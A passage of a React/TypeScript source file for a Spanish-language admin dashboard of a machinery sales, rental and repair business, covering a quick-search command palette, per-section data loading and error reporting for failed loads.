import { useEffect, useState, useCallback, useRef, useMemo, useSyncExternalStore, lazy, Suspense } from 'react'
import Modal from '../components/Modal'
import CajaPOS from './CajaPOS'
import { createPortal } from 'react-dom'
import { Link, useNavigate, useLocation } from 'react-router-dom'
import QRCode from 'qrcode'
import api from '../lib/api'
import { cuandoLlego, formatMoney } from '../lib/utils'
import DialogoHost, { confirmar, pedir, elegir } from '../components/Dialogo'

import TicketModal from '../components/TicketModal'
import VentaDetalleModal from '../components/VentaDetalleModal'
import EtiquetaModal from '../components/EtiquetaModal'
import FichaTecnicaModal from '../components/FichaTecnicaModal'
import ClientesAdmin from '../components/ClientesAdmin'
import Dock, { type DockItem } from '../components/ui/dock'
import { REGIMEN_FISCAL, USO_CFDI } from '../lib/sat'
import { AnimatePresence, motion, useReducedMotion } from 'framer-motion'
import { useRecurso, invalidar, type Tema } from '../lib/realtime'
import { useLatidoPanel } from '../lib/latido'
import { CLAVE_JORNADA, recordarAcceso, ProveedorPermisos, usePuede, type Capacidades } from '../lib/acceso'
import { useAuth } from '../store/auth'
import { useToast, type Notify } from '../store/toast'
import ThemeToggle from '../components/ThemeToggle'
import PieByRix from '../components/PieByRix'
import { AvatarUsuario } from '../components/ui/avatar-usuario'
import { KpiGrid, type KpiItem, type KpiTone } from '../components/ui/kpi-grid'
import Paginador from '../components/ui/paginador'
import { usePaginado } from '../components/ui/usar-paginado'
import NumberFlow, { NumberFlowGroup } from '@number-flow/react'
import { Monto, Numero } from '../components/ui/numero'
import resolveMediaUrl from '../lib/resolveMediaUrl'
import LogoRemali from '../components/ui/logo-remali'
import { waLink } from '../lib/whatsapp'
import { useLang } from '../lib/i18n'

import {
  AbonoModal, type AdeudosDatos, BotonExportar, BuscarCuenta, Card, CardBarra, type Coupon, type CuentaCliente,
  type DashMetrics, type Empresa, type Equipo, EstadoVacio, type Evidencia, FACTURA_VACIA,
  type FacturaData, FacturaFields, FilasEsqueleto, FiltroChips, InputDinero, type Notif, type Option, type OrdenReparacion,
  type Pedido, type PedidosDatos, type Refaccion, type RentaActiva, type RentaFull,
  SECTION_META, type Section, Segmentado, SelectorPeriodo, type SolicitudFactura, type Unidad,
  type UsuarioPanel, type Venta, abrirOrdenCartaPDF, descargarReporte, equipoFromUnit,
  errorMsg, fijarCotEnCurso, fijarRentaAAbrir, fijarVentaAAbrir, input,
  label, leerCotEnCurso, MenuFila, num, orMoney, pillCond, progresoCot, siguientePaso, suscribirCot,
  pillEstado, seRenta, tomarLlegaDeTraspaso, tomarRentaAAbrir, tomarRentaEnVuelo,
  tomarVentaAAbrir, validarFactura,
} from './dashboard/comun'

import { RentModal, SellModal, NuevoPedidoModal, RenovarRentaModal } from './dashboard/hojas'
import GraficaIngresos, { SERIES_INGRESO } from './dashboard/grafica-ingresos'
import BarrasApiladas from '../components/charts/barras-apiladas'
import BarrasRanking from '../components/charts/barras-ranking'
import Dona from '../components/charts/dona'
import AreaOcupacion from '../components/charts/area'
import { diaCorto, dinero } from '../components/charts/formato'
import { anotarFallo } from '../lib/fallo'

const MESES = ['Ene', 'Feb', 'Mar', 'Abr', 'May', 'Jun', 'Jul', 'Ago', 'Sep', 'Oct', 'Nov', 'Dic']

/* Fuera del componente a propósito. Declarados dentro de su cuerpo, cada render
   creaba funciones NUEVAS: para React son componentes distintos, así que tiraba
   el subárbol y lo montaba de nuevo en vez de actualizarlo (se pierde estado,
   foco y posición de scroll de lo que haya dentro). Ver la regla
   rerender-no-inline-components. */
function Field({ label, value, full, labelCls }: { label: string; value?: React.ReactNode; full?: boolean; labelCls?: string }) {
  if (!value) return null
  return (
    <div className={full ? 'col-span-2' : ''}>
      <p className={`text-[12px] ${labelCls || 'text-mute'}`}>{label}</p>
      <p className="text-[13.5px] font-bold text-ink break-words leading-snug mt-0.5">{value}</p>
    </div>
  )
}

function Titulo({ children }: { children: React.ReactNode }) {
  return <p className="text-[11px] font-extrabold tracking-[0.5px] text-gold-ink mb-3">{children}</p>
}

const ReparacionesAdmin = lazy(() => import('./dashboard/reparaciones'))

const UbicacionesAdmin = lazy(() => import('./dashboard/jornada'))

const EquipoAdmin = lazy(() => import('./dashboard/equipo'))
const PermisosAdmin = lazy(() => import('./dashboard/permisos'))

const CotizacionesAdmin = lazy(() => import('./dashboard/cotizaciones'))

/* Configuración es la sección más pesada y la que menos se abre: viaja aparte
   y se descarga solo cuando alguien entra a ella. */
const ConfiguracionAdmin = lazy(() => import('./dashboard/configuracion'))
// La MISMA pantalla que la pestaña "Cuenta" de Configuración, no una copia.
const PerfilAdmin = lazy(() => import('./dashboard/configuracion').then(m => ({ default: m.PerfilAdmin })))

/**
 * Sección donde abre el panel. Administración empieza en el Resumen; el almacén
 * en Inventario, que es su trabajo. Se lee del nivel recordado para no pintar
 * primero una sección que el usuario no puede ver.
 */
/** Sección con la que abre quien llega a `/dashboard` PELADO, sin sección en la
 *  URL. Ya no es "la sección del panel": esa vive en la dirección (ver `section`
 *  más abajo), para que recargar, compartir un enlace o dar "atrás" funcionen. */
function seccionInicial(): Section {
  try {
    // Quien ACTÚA en campo abre en su jornada. Se pregunta por la capacidad, no
    // por el nivel: el cajero y el asesor también son nivel 1 y no andan en obra
    // —abrirles ahí una sección que no les toca provocaba un parpadeo hasta que
    // llegaba el perfil y el panel los rebotaba a su primera sección.
    return localStorage.getItem(CLAVE_JORNADA) === '1' ? 'ubicaciones' : 'resumen'
  } catch {
    return 'resumen'
  }
}

/* ════════════════════════════════════════
   COMMAND PALETTE (⌘K / Alt+K)
════════════════════════════════════════ */
type PaletteRes = { key: string; group: string; label: string; sub?: string; badge?: string; run: () => void }

function CommandPalette({ equipos, unidades, rentas, ventas, go, onClose }: {
  equipos: Equipo[]; unidades: Unidad[]; rentas: RentaActiva[]; ventas: Venta[]
  go: (s: Section) => void; onClose: () => void
}) {
  const [q, setQ] = useState('')
  const [idx, setIdx] = useState(0)
  const { t } = useLang()
  const inputRef = useRef<HTMLInputElement>(null)
  useEffect(() => { inputRef.current?.focus() }, [])
  useEffect(() => { setIdx(0) }, [q])

  const n = q.trim().toLowerCase()
  const results: PaletteRes[] = []

  // Navegación a módulos
  ;(Object.keys(SECTION_META) as Section[]).forEach(s => {
    const title = t(`sec.${s}.title`)
    if (!n || title.toLowerCase().includes(n)) results.push({ key: 'nav-' + s, group: t('palette.goto'), label: title, sub: t(`sec.${s}.sub`), run: () => go(s) })
  })

  if (n) {
    equipos.filter(e => (e.modelo || '').toLowerCase().includes(n)).slice(0, 6).forEach(e =>
      results.push({ key: 'eq-' + e.id, group: 'Productos', label: e.modelo, sub: [e.categoria?.nombre, e.marca?.nombre].filter(Boolean).join(' · ') || '—', run: () => go('equipos') }))
    unidades.filter(u => (u.codigo || '').toLowerCase().includes(n) || (u.numero_serie || '').toLowerCase().includes(n)).slice(0, 6).forEach(u =>
      results.push({ key: 'un-' + u.id, group: 'Inventario', label: u.codigo || '—', sub: u.equipo_modelo || u.equipo_info?.modelo || '', badge: u.estado, run: () => go('inventario') }))
    rentas.filter(r => (r.cliente || '').toLowerCase().includes(n) || (r.inventario?.codigo || '').toLowerCase().includes(n)).slice(0, 5).forEach(r =>
      results.push({ key: 'rt-' + r.id, group: 'Rentas', label: r.cliente || 'Cliente', sub: `${r.inventario?.equipo || ''} · ${r.inventario?.codigo || ''}`, run: () => go('rentas') }))
    ventas.filter(v => (v.nombre_cliente || '').toLowerCase().includes(n) || (v.unidad?.codigo || '').toLowerCase().includes(n)).slice(0, 5).forEach(v =>
      results.push({ key: 'vt-' + v.id, group: 'Ventas', label: v.nombre_cliente || 'Cliente general', sub: `${v.unidad?.equipo || 'Refacciones'} · $${v.total}`, run: () => go('ventas') }))
  }

  const safeIdx = results.length ? Math.min(idx, results.length - 1) : 0
  const run = (r?: PaletteRes) => { if (r) { r.run(); onClose() } }

  function onKeyDown(e: React.KeyboardEvent) {
    if (e.key === 'ArrowDown') { e.preventDefault(); setIdx(i => Math.min(i + 1, results.length - 1)) }
    else if (e.key === 'ArrowUp') { e.preventDefault(); setIdx(i => Math.max(i - 1, 0)) }
    else if (e.key === 'Enter') { e.preventDefault(); run(results[safeIdx]) }
    else if (e.key === 'Escape') { e.preventDefault(); onClose() }
  }

  return (
    <Modal className="modal-in fixed inset-0 z-[100] bg-black/30 backdrop-blur-md flex items-start justify-center pt-[12vh] px-4" onClose={onClose} label="Buscador rápido">
      <div onClick={e => e.stopPropagation()} className="relative w-full max-w-[560px] bg-surface/65 backdrop-blur-2xl backdrop-saturate-150 border border-white/15 rounded-2xl shadow-[0_24px_70px_rgba(17,24,39,0.45)] ring-1 ring-inset ring-white/10 overflow-hidden">
        {/* brillo superior tipo cristal */}
        <div className="pointer-events-none absolute inset-x-0 top-0 h-24 bg-gradient-to-b from-white/12 to-transparent" />
        <div className="relative flex items-center gap-3 px-4 py-3.5 border-b border-edge/50">
          <svg className="w-4 h-4 text-mute shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="2"><circle cx="11" cy="11" r="7" /><path d="M21 21l-4-4" strokeLinecap="round" /></svg>
          <input aria-label="Buscar en el panel" ref={inputRef} value={q} onChange={e => setQ(e.target.value)} onKeyDown={onKeyDown} placeholder={t('palette.search')} className="flex-1 bg-transparent text-[15px] outline-none placeholder-mute" />
          <span className="text-[11px] font-bold text-mute bg-ink/10 rounded px-1.5 py-0.5 shrink-0">ESC</span>
        </div>
        <div className="relative max-h-[52vh] overflow-y-auto py-2">
          {results.length === 0 && <div className="px-4 py-10 text-center text-sm text-mute">Sin resultados para “{q}”.</div>}
          {results.map((r, i) => {
            const showGroup = i === 0 || results[i - 1].group !== r.group
            return (
              <div key={r.key}>
                {showGroup && <div className="px-4 pt-3 pb-1 text-[11px] font-bold uppercase tracking-wide text-mute">{r.group}</div>}
                <button
                  onMouseEnter={() => setIdx(i)}
                  onClick={() => run(r)}
                  className={`w-full flex items-center gap-3 px-4 py-2.5 text-left transition-colors ${i === safeIdx ? 'bg-gold-soft' : 'hover:bg-ink/5'}`}
                >
                  <span className={`w-8 h-8 rounded-lg flex items-center justify-center shrink-0 text-[11px] font-extrabold ${i === safeIdx ? 'bg-gold text-gold-on' : 'bg-ink/10 text-mute'}`}>{r.group[0]}</span>
                  <div className="flex-1 min-w-0">
                    <div className={`text-[14px] font-semibold truncate ${i === safeIdx ? 'text-gold-ink' : 'text-ink'}`}>{r.label}</div>
                    {r.sub && <div className="text-[12px] text-mute truncate">{r.sub}</div>}
                  </div>
                  {r.badge && <span className="text-[10px] font-bold uppercase px-2 py-0.5 rounded bg-ink/10 text-mute shrink-0">{r.badge}</span>}
                  <span className="text-mute text-xs shrink-0">↵</span>
                </button>
              </div>
            )
          })}
        </div>
        <div className="relative px-4 py-2.5 border-t border-edge/50 flex items-center gap-4 text-[11px] text-mute">
          <span><b className="text-ink">↑↓</b> navegar</span>
          <span><b className="text-ink">↵</b> abrir</span>
          <span><b className="text-ink">esc</b> cerrar</span>
        </div>
      </div>
    </Modal>
  )
}

/* ════════════════════════════════════════
   DASHBOARD
════════════════════════════════════════ */
/* Qué datos necesita cada sección. Lo que no aparezca aquí, no se pide: entrar
   a Caja no tiene por qué bajar el historial de ventas ni el padrón entero.
   'padron' es la lista de clientes que alimenta los selectores de los
   formularios (no el conteo del globito, que va siempre y es de una cifra). */
const RECURSOS_POR_SECCION: Record<Section, string[]> = {
  resumen: ['metricas', 'equipos', 'unidades', 'rentas', 'ventas', 'cupones', 'adeudos', 'pedidos', 'facturacion', 'catalogos'],
  caja: ['unidades', 'equipos'],
  equipos: ['equipos', 'catalogos', 'unidades'],
  inventario: ['unidades', 'equipos', 'rentas', 'refacciones'],
  refacciones: ['refacciones'],
  reparaciones: ['reparaciones', 'refacciones', 'unidades', 'padron'],
  cotizaciones: ['padron'],
  catalogos: ['catalogos', 'equipos'],
  clientes: [],
  rentas: ['rentas', 'unidades'],
  ventas: [],                       // VentasAdmin pide su propia lista, paginada
  pedidos: ['pedidos', 'equipos', 'padron'],
  facturacion: ['facturacion'],
  adeudos: ['adeudos', 'pedidos'],
  cupones: ['cupones'],
  perfil: [],
  ubicaciones: ['unidades', 'padron', 'reparaciones'],
  equipo: ['usuarios'],
  permisos: ['permisos'],
  configuracion: [],
}

/** En lo que busca ⌘K. Se cargan mientras la paleta está abierta. */
const RECURSOS_PALETA = ['equipos', 'unidades', 'rentas', 'ventas']

/** Los conteos quedan viejos con casi cualquier movimiento del negocio. */
const TEMAS_CONTEOS: Tema[] = [
  'equipos', 'unidades', 'catalogos', 'cupones', 'rentas', 'ventas',
  'cotizaciones', 'refacciones', 'reparaciones', 'facturacion', 'clientes', 'usuarios',
]

/** Los números de los globitos del menú. Vienen de /dashboard/conteos/. */
type Conteos = {
  equipos: number; unidades: number; refacciones: number; catalogos: number
  rentas_activas: number; ventas: number; pedidos: number; ordenes_abiertas: number
  facturas_pendientes: number; adeudos: number; cupones: number; equipo_activos: number
}

export default function Dashboard() {
  const { logout } = useAuth()
  const nav = useNavigate()
  // Dónde abre el panel según quién entra. El nivel se recuerda del último
  // acceso porque el perfil llega por red: sin esto, un almacenista vería
  // Resumen (que no puede consultar) hasta que respondiera la API.
  /* ── La sección vive en la URL, no en estado ──
     Antes era `useState`, así que la dirección siempre decía `/dashboard` sin
     importar dónde estuvieras: al recargar volvías al Resumen, el botón "atrás"
     del navegador se salía del panel, y no había forma de mandarle a alguien
     "mira este adeudo" más que de palabra. Ahora `/dashboard/adeudos` ES la
     sección, y todo eso funciona solo. */
  const location = useLocation()
  const slug = location.pathname.replace(/^\/dashboard\/?/, '').split('/')[0]
  /* Un segundo tramo en la dirección (`/dashboard/cotizaciones/12`) significa
     que la sección está enseñando UN REGISTRO, no su lista. Esa página trae su
     propio encabezado —migas hasta el folio, y el folio de título—, así que el
     genérico de aquí sobra: con los dos puestos salían dos títulos encimados,
     el de arriba diciendo "Cotizaciones" sobre una cotización concreta. */
  const enDetalle = location.pathname.replace(/^\/dashboard\/?/, '').split('/').filter(Boolean).length > 1
  const porDefecto = useRef<Section>(seccionInicial()).current
  const section: Section = (slug in SECTION_META ? slug : porDefecto) as Section
  const irASeccion = useCallback((s: Section, reemplazar = false) => {
    nav(`/dashboard/${s}`, { replace: reemplazar })
  }, [nav])
  // Quien entra a `/dashboard` a secas se queda sin sección en la dirección, así
  // que la fijamos de inmediato — con `replace` para no ensuciar el historial.
  useEffect(() => {
    if (!(slug in SECTION_META)) irASeccion(porDefecto, true)
  }, [slug, porDefecto, irASeccion])
  const [sidebarOpen, setSidebarOpen] = useState(false)
  // Menú colapsado a solo-iconos (riel), solo en desktop. Se recuerda entre visitas.
  const [colapsado, setColapsado] = useState(() => { try { return localStorage.getItem('admin_sidebar_colapsado') === '1' } catch { return false } })
  const toggleColapsado = () => setColapsado(v => { const n = !v; try { localStorage.setItem('admin_sidebar_colapsado', n ? '1' : '0') } catch { /* modo privado */ } return n })
  const [me, setMe] = useState<{
    id?: number; username?: string; email?: string; avatar_url?: string | null
    /** Segunda capa: el dibujo POR ROL que manda `/auth/me/`. Si la foto subida
     *  se cae (Cloudinary borra el asset, la firma vence), el panel enseña el
     *  del rol —lo mismo que la tienda— en vez de la inicial. */
    avatar_url_rol?: string | null
    is_superuser?: boolean
    puede?: Capacidades
  } | null>(null)
  const [usuarios, setUsuarios] = useState<UsuarioPanel[]>([])

  /* ── Caja del mostrador ──
     El Dashboard es el dueño de las hojas de venta y renta; la caja solo las
     pide. Así hay UNA hoja de cada cosa en todo el sistema en vez de una copia
     para el mostrador, y el IVA, el depósito y el padrón se comportan igual
     entren por donde entren. */
  const [cajaVender, setCajaVender] = useState<Unidad | null>(null)
  const [cajaRentar, setCajaRentar] = useState<Unidad | null>(null)
  const [cajaCfg, setCajaCfg] = useState({ vende: false, renta: false })

  const [equipos, setEquipos] = useState<Equipo[]>([])
  const [coupons, setCoupons] = useState<Coupon[]>([])
  const [categorias, setCategorias] = useState<Option[]>([])
  const [tipos, setTipos] = useState<Option[]>([])
  const [marcas, setMarcas] = useState<Option[]>([])
  const [metrics, setMetrics] = useState<DashMetrics | null>(null)
  const [rentas, setRentas] = useState<RentaActiva[]>([])
  const [unidades, setUnidades] = useState<Unidad[]>([])
  const [refacciones, setRefacciones] = useState<Refaccion[]>([])
  const [ordenes, setOrdenes] = useState<OrdenReparacion[]>([])
  const [ordenAbrir, setOrdenAbrir] = useState<number | null>(null)
  const [solicitudes, setSolicitudes] = useState<SolicitudFactura[]>([])
  const [adeudos, setAdeudos] = useState<AdeudosDatos>({ rentas: [], total: '0', clientes: 0 })
  const [pedidos, setPedidos] = useState<PedidosDatos>({ pedidos: [], total: '0', clientes: 0 })
  const [cotAbiertas, setCotAbiertas] = useState(0)
  /* Los números de los globitos del menú, en UNA respuesta chica. Antes cada
     globito costaba su lista completa: el panel bajaba productos, unidades,
     ventas, refacciones, órdenes, usuarios y cupones —enteros— para escribir
     siete cifras, y los volvía a bajar con cada latido. */
  const [conteos, setConteos] = useState<Conteos | null>(null)
  const [ventas, setVentas] = useState<Venta[]>([])
  const [notifs, setNotifs] = useState<Notif[]>([])
  /* Quien pidió menos movimiento no pierde el aviso, pierde el viaje: la fila
     se desvanece en su sitio y el hueco se cierra sin FLIP. Descartar sigue
     confirmándose. */
  const menosMovimiento = useReducedMotion()
  const [noLeidas, setNoLeidas] = useState(0)
  const [empresas, setEmpresas] = useState<Empresa[]>([])
  const [clientesTotal, setClientesTotal] = useState(0)

  const notifBtnRef = useRef<HTMLButtonElement | null>(null)
  const notifPanelRef = useRef<HTMLDivElement | null>(null)
  const notifCloseTimeoutRef = useRef<number | null>(null)
  const notifMaxIdRef = useRef(0)
  const searchInputRef = useRef<HTMLInputElement | null>(null)
  const [reduceMotion, setReduceMotion] = useState(false)
  const [notifMounted, setNotifMounted] = useState(false)
  const [notifOpen, setNotifOpen] = useState(false)
  const [notifPulse, setNotifPulse] = useState(false)
  const [invEquipo, setInvEquipo] = useState<Equipo | null>(null)
  const [pendingEquipoId, setPendingEquipoId] = useState<number | null>(null)
  const [accountOpen, setAccountOpen] = useState(false)
  const [paletteOpen, setPaletteOpen] = useState(false)
  const [langOpen, setLangOpen] = useState(false)
  const { lang, setLang, t } = useLang()
  const cambiarIdioma = (l: 'ES' | 'EN') => { setLang(l); setLangOpen(false) }

  // Atajo de búsqueda: ⌘K (Mac) / Alt+K (Windows) / Ctrl+K
  useEffect(() => {
    const onKey = (e: KeyboardEvent) => {
      if (e.key.toLowerCase() === 'k' && (e.metaKey || e.altKey || e.ctrlKey)) {
        e.preventDefault()
        setPaletteOpen(true)
      }
    }
    window.addEventListener('keydown', onKey)
    return () => window.removeEventListener('keydown', onKey)
  }, [])

  /* Las alertas del panel son las MISMAS que las de la tienda: un solo
     proveedor (store/toast), un solo vocabulario de tipos y una sola duración
     (lib/alertas). Antes el panel tenía su propia pila, su propio render y sus
     3.2s a mano mientras la tienda usaba 5s. */
  const { notify } = useToast()

  /* Cargas de DINERO que fallaron. Sin esto, un 500 o un token vencido se ve
     idéntico a "no hay ventas": el admin lee $0 y lo cree. El banner de arriba
     lo hace visible y deja reintentar. Solo aplica a los loaders de dinero;
     los demás (catálogos, notifs) fallan sin consecuencias que engañen. */
  const [cargasFallidas, setCargasFallidas] = useState<string[]>([])
  const marcarCarga = useCallback((k: string, ok: boolean) => {
    setCargasFallidas(prev => {
      const tiene = prev.includes(k)
      if (ok && tiene) return prev.filter(x => x !== k)
      if (!ok && !tiene) return [...prev, k]
      return prev
    })
  }, [])

  /* Trae un pedazo del panel y DEJA CONSTANCIA si no llegó.

     Todos los cargadores terminaban en un catch vacío. Con eso un 500 o un
     token vencido se ve idéntico a "no hay nada": la lista queda vacía, el panel
     no dice una palabra y la depuración arranca a ciegas —el "panel mudo" que ya
     nos costó dos rondas—. Ahora ningún fallo se va sin línea en la consola.

     `dinero: true` además lo sube al banner de arriba, porque leer $0 cuando en
     realidad la petición falló es el error que de verdad se cree. Para un
     catálogo o las notificaciones basta la consola: esos no engañan a nadie.

     401/403 quedan fuera a propósito: no es "no cargó", es "no te toca" o la
     sesión venció, y de eso avisa el guardia de sesión. Marcarlo aquí solo
     taparía el motivo real con una alarma por sección. */
  /* Qué recursos ya contestaron al menos una vez.

     Sin esto, entrar a un módulo enseña su cartel de "todavía no hay nada"
     mientras la lista viene en camino: un vacío que es MENTIRA y que además
     parpadea al llegar los datos. Antes lo tapaba el overlay de pantalla
     completa, que es justo el parpadeo que hubo que quitar. Se marca al
     ASENTARSE (bien o mal): si la petición falló, el cartel de vacío es lo
     honesto —el fallo lo cuenta el banner o la consola—, y quedarse en
     "Cargando…" para siempre sería peor. */
  const [cargados, setCargados] = useState<Set<string>>(() => new Set())
  const marcarCargado = useCallback((nombre: string) => {
    setCargados(prev => (prev.has(nombre) ? prev : new Set(prev).add(nombre)))
  }, [])
  /** ¿Este recurso ya llegó? Con `false`, la lista vacía es "aún no sé". */
  const listo = useCallback((nombre: string) => cargados.has(nombre), [cargados])

  const cargar = useCallback(<T,>(
    nombre: string,
    peticion: Promise<{ data: T }>,
    aplicar: (d: T) => void,
    dinero = false,
  ) => peticion
    .then(r => { aplicar(r.data); if (dinero) marcarCarga(nombre, true) })
    .catch(err => {
      const st = err?.response?.status
      if (st === 401 || st === 403) return
      if (dinero) marcarCarga(nombre, false)
      console.error(`[panel] no se pudo cargar ${nombre}:`, st ? `HTTP ${st}` : err?.message || err)
    })
    .finally(() => marcarCargado(nombre)), [marcarCarga, marcarCargado])

  const loadConteos = useCallback(() => {
    cargar('conteos', api.get<Conteos>('/dashboard/conteos/', { fondo: true }), d => setConteos(d || null))
  }, [cargar])
  const loadUsuarios = useCallback(() => {
    cargar('usuarios', api.get<{ usuarios: UsuarioPanel[] }>('/usuarios/', { fondo: true }), d => setUsuarios(d?.usuarios || []))
  }, [cargar])
  const loadMetrics = useCallback(() => {
    cargar('métricas', api.get<DashMetrics>('/dashboard/metricas/', { fondo: true }), d => setMetrics(d || null), true)
  }, [cargar])
  const loadEquipos = useCallback(() => {
    cargar('equipos', api.get<Equipo[]>('/equipos/', { fondo: true }), d => setEquipos(d || []))
  }, [cargar])
  const loadCatalogos = useCallback(() => {
    cargar('categorías', api.get<Option[]>('/categorias/', { fondo: true }), d => setCategorias(d || []))
    cargar('tipos', api.get<Option[]>('/tipos/', { fondo: true }), d => setTipos(d || []))
    cargar('marcas', api.get<Option[]>('/marcas/', { fondo: true }), d => setMarcas(d || []))
  }, [cargar])
  const loadCoupons = useCallback(() => {
    cargar('cupones', api.get<Coupon[]>('/cupones/', { fondo: true }), d => setCoupons(d || []))
  }, [cargar])
  const loadRentas = useCallback(() => {
    cargar('rentas activas', api.get<{ rentas: RentaActiva[] }>('/rentas/?estado=activa', { fondo: true }), d => setRentas(d?.rentas || []), true)
  }, [cargar])
  const loadUnidades = useCallback(() => {
    cargar('unidades', api.get<Unidad[]>('/unidades/', { fondo: true }), d => setUnidades(d || []))
  }, [cargar])
  const loadRefacciones = useCallback(() => {
    cargar('refacciones', api.get<Refaccion[]>('/refacciones/', { fondo: true }), d => setRefacciones(d || []))
  }, [cargar])
  const loadOrdenes = useCallback(() => {
    cargar('reparaciones', api.get<OrdenReparacion[]>('/reparaciones/', { fondo: true }), d => setOrdenes(d || []))
  }, [cargar])
  const loadFacturacion = useCallback(() => {
    cargar('facturación', api.get<SolicitudFactura[]>('/facturacion/solicitudes/', { fondo: true }), d => setSolicitudes(d || []), true)
  }, [cargar])
  // Adeudos y pedidos SON dinero (cuentas por cobrar): iban con catch mudo, así
  // que un fallo se leía como "nadie debe nada". Ahora van al banner.
  const loadAdeudos = useCallback(() => {
    cargar('adeudos', api.get<AdeudosDatos>('/rentas/adeudos/', { fondo: true }), d => setAdeudos(d || { rentas: [], total: '0', clientes: 0 }), true)
  }, [cargar])
  // Apartados/pedidos con saldo (cuentas por cobrar de VENTA). Junto con las rentas
  // forman las "cuentas por cobrar unificadas" de Adeudos.
  const loadPedidos = useCallback(() => {
    cargar('pedidos', api.get<PedidosDatos>('/ventas/pedidos/', { fondo: true }), d => setPedidos(d || { pedidos: [], total: '0', clientes: 0 }), true)
  }, [cargar])
  // Solo el conteo de "abiertas" para el badge del menú: la lista completa la
  // pagina el propio módulo de cotizaciones, no el padre.
  const loadCotizaciones = useCallback(() => {
    cargar('cotizaciones', api.get<{ abiertas: number }>('/cotizaciones/stats/', { fondo: true }), d => setCotAbiertas(d?.abiertas || 0), true)
  }, [cargar])
  const loadVentas = useCallback(() => {
    cargar('ventas', api.get<{ ventas: Venta[] }>('/ventas/lista/', { fondo: true }), d => setVentas(d?.ventas || []), true)
  }, [cargar])
  // Solo el CONTADOR para el badge del menú: la lista la trae ClientesAdmin
  // paginada. Pedir el padrón entero aquí sería justo lo que no debe hacerse.
  const loadClientesTotal = useCallback(() => {
    cargar('total de clientes', api.get<{ total: number }>('/clientes/?limite=1', { fondo: true }), d => setClientesTotal(d?.total || 0))
  }, [cargar])

  const loadEmpresas = useCallback(() => {
    // El padrón sustituyó a /empresas/. Se piden solo los activos y se
    // adaptan a la forma que ya esperan los selectores, para no reescribir
    // cinco formularios en el mismo movimiento.
    cargar('padrón de clientes',
      api.get<{ clientes: { id: number; nombre: string; activo: boolean }[] }>('/clientes/?limite=100', { fondo: true }),
      d => setEmpresas((d?.clientes || []).map(c => ({ id: c.id, nombre: c.nombre, activa: c.activo }))))
  }, [cargar])
  const loadNotifs = useCallback(() => {
    cargar('notificaciones', api.get<{ notificaciones: Notif[]; no_leidas: number }>('/notificaciones/', { fondo: true }), d => {
      const items = (d?.notificaciones || []) as Notif[]
      setNotifs(items)
      setNoLeidas(d?.no_leidas || 0)
      const maxId = items.reduce((m, n) => Math.max(m, Number(n.id) || 0), 0)
      if (notifMaxIdRef.current && maxId > notifMaxIdRef.current) {
        setNotifPulse(true)
        window.setTimeout(() => setNotifPulse(false), 900)
        // La notificación recién llegada también se asoma como alerta, sin
        // esperar a abrir el panel: es INFORMATIVA (nadie logró nada), con la
        // campana como dibujo.
        const nueva = items.find(n => Number(n.id) === maxId)
        if (nueva) notify(nueva.titulo || 'Nueva notificación', 'info', 'campana')
      }
      notifMaxIdRef.current = maxId
    })
  }, [cargar, notify])


  useEffect(() => {
    const mql = window.matchMedia?.('(prefers-reduced-motion: reduce)')
    if (!mql) return
    const apply = () => setReduceMotion(mql.matches)
    apply()
    mql.addEventListener?.('change', apply)
    return () => mql.removeEventListener?.('change', apply)
  }, [])

  const cargarPerfil = useCallback(() => {
    api.get('/auth/perfil/').then(r => {
      setMe(r.data)
      recordarAcceso(r.data)   // acento y sección para la próxima carga
    }).catch(anotarFallo)
  }, [])
  // Si el dueño mueve permisos —desde esta pantalla o desde otra computadora—,
  // el panel se entera por el latido y vuelve a preguntar QUÉ PUEDE esta cuenta.
  // Sin esto, apagarle la caja a un cajero no le quitaba la sección hasta que
  // cerrara sesión: seguía viendo un botón que la API ya le negaba.
  useRecurso(['permisos'], cargarPerfil)


  // Cada conjunto de datos se suscribe a los temas que lo dejan viejo. Cuando
  // una mutación toca uno de esos temas, esto se vuelve a pedir solo: ya no hay
  // que recargar la página para ver los KPIs, el stock o las listas al día.
  /* Cada lista se pide SOLO donde se usa. Antes el panel pedía las dieciséis al
     entrar —productos, unidades, ventas, refacciones, órdenes, rentas, cupones,
     el padrón…— sin importar a qué sección ibas, y el latido las volvía a pedir
     todas cada vez que alguien tocaba algo. Un cajero que abre la caja bajaba el
     historial de ventas entero.

     Los globitos del menú NO dependen de esto: sus números vienen de
     /dashboard/conteos/, que es una sola respuesta chica y sí va siempre.
     Y ⌘K busca en productos, unidades, rentas y ventas: mientras la paleta está
     abierta esos cuatro cuentan como necesarios, se abra donde se abra. */
  const necesita = useCallback((r: string) => {
    if ((RECURSOS_POR_SECCION[section] || []).includes(r)) return true
    return paletteOpen && RECURSOS_PALETA.includes(r)
  }, [section, paletteOpen])

  useRecurso(TEMAS_CONTEOS, loadConteos)
  useRecurso(['metricas'], loadMetrics, necesita('metricas'))
  useRecurso(['usuarios'], loadUsuarios, necesita('usuarios'))
  useRecurso(['equipos'], loadEquipos, necesita('equipos'))
  useRecurso(['catalogos'], loadCatalogos, necesita('catalogos'))
  useRecurso(['cupones'], loadCoupons, necesita('cupones'))
  useRecurso(['rentas'], loadRentas, necesita('rentas'))
  useRecurso(['unidades'], loadUnidades, necesita('unidades'))
  useRecurso(['refacciones'], loadRefacciones, necesita('refacciones'))
  useRecurso(['reparaciones'], loadOrdenes, necesita('reparaciones'))
  useRecurso(['facturacion'], loadFacturacion, necesita('facturacion'))
  useRecurso(['rentas'], loadAdeudos, necesita('adeudos'))   // los abonos tocan Renta: el saldo baja solo
  useRecurso(['notificaciones'], loadNotifs)
  useRecurso(['cotizaciones'], loadCotizaciones)

  // Los dos interruptores de la caja. Se leen una vez al entrar al panel: son
  // configuración del negocio, no cambian a media jornada. Si la lectura falla
  // se quedan apagados —es el lado seguro: el servidor los valida de todos
  // modos, así que un botón de más solo daría un error, no una venta indebida.
  useEffect(() => {
    api.get<{ caja_vende_maquinaria: boolean; caja_renta_maquinaria: boolean }>('/config/')
      .then(r => setCajaCfg({ vende: !!r.data?.caja_vende_maquinaria, renta: !!r.data?.caja_renta_maquinaria }))
      .catch(anotarFallo)
  }, [])
  // Latido del panel: lo que capturan OTROS (un cliente envía su cotización,
  // otro admin edita un producto o registra una renta) llega solo en ~2 s,
  // y solo se recarga el tema que de verdad cambió.
  useLatidoPanel('/latido/', 2_000, temas => invalidar(...(temas as Tema[])))
  useRecurso(['ventas'], loadVentas, necesita('ventas'))
  useRecurso(['ventas'], loadPedidos, necesita('pedidos'))   // los apartados son ventas: abonos/entregas los refrescan
